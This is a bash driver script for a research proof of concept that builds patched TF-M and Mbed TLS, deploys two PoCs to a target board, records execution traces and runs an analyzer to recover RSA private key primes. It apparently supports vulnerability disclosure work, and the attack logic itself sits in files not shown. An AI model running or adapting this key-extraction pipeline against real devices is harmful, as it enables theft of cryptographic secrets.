#!/usr/bin/env bash
ROOT="$(realpath "$(dirname "$0")")"

MSTP="${ROOT}/src-poc/m-step"
MSTP_DIR="$(realpath "${MSTP}")"

NS="${ROOT}/src-poc/m-step-poc-ns"
NS_DIR="$(realpath "${NS}")"

# Static Configuration Values
CLEAN=false
DEBUG_MODE=true # default is debug
ANALYZE_FLAG="" # debug templates by default, set to -r for production mode

#-------------------------------------------------------------------------------
# Parse arguments
#-------------------------------------------------------------------------------
set -e

while [[ $# -gt 0 ]]; do
    case "$1" in
        -c|--clean)
            CLEAN=true
            shift
            ;;
        -d|--debug)
            #Requires MSTP_DEBUG=DEBUG_ON (the default in src-poc/m-step/mstp/inc/mstp.h).
            DEBUG_MODE=true
            ANALYZE_FLAG=""
            shift
            ;;
        -r|--raw)
            # Requires building with MSTP_DEBUG=DEBUG_OFF (see src-poc/m-step/mstp/inc/mstp.h).
            DEBUG_MODE=false
            ANALYZE_FLAG="-r"
            shift
            ;;
        -h|--help)
            echo "Usage: $0 [-c|--clean] [-d|--debug] [-r|--raw]"
            echo "  (default)      debug trace; analyzed with debug templates"
            echo "  -d, --debug    debug trace (default); needs MSTP_DEBUG=DEBUG_ON in mstp.h"
            echo "  -r, --raw      production (raw) trace; set MSTP_DEBUG=DEBUG_OFF in mstp.h"
            exit 0
            ;;
        *)
            echo "Unknown argument: $1"
            echo "Usage: $0 [-c|--clean] [-d|--debug] [-r|--raw]"
            exit 1
            ;;
    esac
done

#-------------------------------------------------------------------------------
# Step 1: Fetch TF-M 
#-------------------------------------------------------------------------------
TFM_REPO="https://review.trustedfirmware.org/TF-M/trusted-firmware-m.git"
TFM_VERSION="TF-Mv2.2.0"
TFM_DIR="$(realpath "${ROOT}/src-poc/m-step-poc-s/trusted-firmware-m")"
PATCHES="$(realpath "${ROOT}/src-poc/m-step-poc-s/patches")"

if [ "$CLEAN" = true ]; then
    echo "Cleaning TF-M..."
    rm -rf ${TFM_DIR} || true
else
    if [ ! -d "${TFM_DIR}" ]; then
        git clone ${TFM_REPO} ${TFM_DIR}
        cd ${TFM_DIR}
        git checkout ${TFM_VERSION}

        # Apply the patch 001-tfm-toolchain-Os.patch: This patch is only enabling  
        # -Os flag for TF-M to fit on the target board with tf-m in Debug mode.
        git apply ${PATCHES}/001-tfm-toolchain-Os.patch

        # Apply the patch 002-tfm-mstp-metrics.patch: This patch is used to get  
        # some debug metrics of the M-Step framework (Debug mode).
        git apply ${PATCHES}/002-tfm-mstp-metrics.patch
    fi
fi

#-------------------------------------------------------------------------------
# Step 2: Fetch Mbedtls
#-------------------------------------------------------------------------------
MBEDTLS_REPO="https://github.com/Mbed-TLS/mbedtls.git"
MBEDTLS_VERSION="mbedtls-3.6.3"
MBEDTLS_DIR="$(realpath "${ROOT}/src-poc/m-step-poc-s/mbedtls")"

if [ "$CLEAN" = true ]; then
    echo "Cleaning MBEDTLS..."
    rm -rf ${MBEDTLS_DIR} || true
else
    if [ ! -d "${MBEDTLS_DIR}" ]; then
        cd ${ROOT}
        git clone ${MBEDTLS_REPO} ${MBEDTLS_DIR}
        cd ${MBEDTLS_DIR}
        git checkout ${MBEDTLS_VERSION}

        # Apply TF-M Patches.
        git apply ${TFM_DIR}/lib/ext/mbedcrypto/*.patch

        # Apply our PoC Patch. This patch doesn't change the inner workings of  
        # the crypto library nor its behavior, it just: 
        # (1) adds a print of the prime numbers to later compare against the 
        # ones retrieved from the trace; 
        # (2) adds a  trigger to start the trace only around the vulnerable 
        # function of interest to speed up the trace; and 
        # (3) adds a function to mount PoC#2 by emulating the rsa_decrypt.c 
        # example program.
        git apply ${PATCHES}/003-mstp-poc.patch
    fi
fi

#-------------------------------------------------------------------------------
# Clean up if requested
#-------------------------------------------------------------------------------
LOG_DIR=${ROOT}/logs
ANALYZER_DIR=${MSTP_DIR}/mstp-analyzer/outputs/

if [ "$CLEAN" = true ]; then
    echo "Cleaning Experiment..."
    rm -r ${LOG_DIR}/* || true 
    rm -r ${ANALYZER_DIR}/* || true 
    ${NS_DIR}/0-config.sh -c
    echo "Clean completed."
    exit 0
fi

#-------------------------------------------------------------------------------
# Step 3 (POC#1): Build PoC, Run the PoC, and Log results
#-------------------------------------------------------------------------------
TEST_CONFIG="${MSTP_DIR}/mstp/inc/test_poc_config.h"
TRACE_POC1=${LOG_DIR}/trace_poc1.txt

${NS_DIR}/0-config.sh

# Enable POC#1
rm -rf "${TEST_CONFIG}"
cat > ${TEST_CONFIG} << 'EOF'
#define POC1_ENABLE

EOF

${NS_DIR}/1-compile.sh 
${NS_DIR}/2-deploy.sh
${NS_DIR}/3-monitor.sh -o ${TRACE_POC1}

#-------------------------------------------------------------------------------
# Step 3 (POC#2): Build PoC, Run the PoC, and Log results
#-------------------------------------------------------------------------------
TRACE_POC2=${LOG_DIR}/trace_poc2.txt

# Enable POC#2
rm -rf "${TEST_CONFIG}"
cat > ${TEST_CONFIG} << 'EOF'
#define POC2_ENABLE

EOF

${NS_DIR}/1-compile.sh 
${NS_DIR}/2-deploy.sh
${NS_DIR}/3-monitor.sh -o ${TRACE_POC2}

#-------------------------------------------------------------------------------
# Step 5: Extract the keys
#-------------------------------------------------------------------------------
ANALYZER=${MSTP_DIR}/mstp-analyzer

echo "#########################################################################"
echo "POC#1"
echo "#------------------------------------------------------------------------"
echo "Expected Private Key"
echo "#------------------------------------------------------------------------"
# Get the generated key from  mbedtls key gen function
grep -E '^\s*(p|q) =' ${TRACE_POC1}
echo "#------------------------------------------------------------------------"
# In raw mode the analyzer auto-reads the PUBLIC modulus N from the trace header
# (PoC1) to auto-correct rare single-step jitters. Debug does not need this
${ANALYZER}/1-analyze-trace.sh ${ANALYZE_FLAG} -t ${TRACE_POC1}
echo "#########################################################################"

echo ""

echo "#########################################################################"
echo "POC#2"
echo "#------------------------------------------------------------------------"
echo "Expected Private Key"
echo "#------------------------------------------------------------------------"
RSA_PRIV=${MBEDTLS_DIR}/programs/pkey/rsa_priv.txt
grep -E '^\s*(P|Q) =' ${RSA_PRIV}
echo "#------------------------------------------------------------------------"
# PoC2's trace has no key header, so in raw mode we supply the PUBLIC modulus N
# from the key file for jitter correction.
if [[ -n "${ANALYZE_FLAG}" ]]; then
    ${ANALYZER}/1-analyze-trace.sh ${ANALYZE_FLAG} -t ${TRACE_POC2} --modulus-from ${RSA_PRIV}
else
    ${ANALYZER}/1-analyze-trace.sh ${ANALYZE_FLAG} -t ${TRACE_POC2}
fi
echo "#########################################################################"
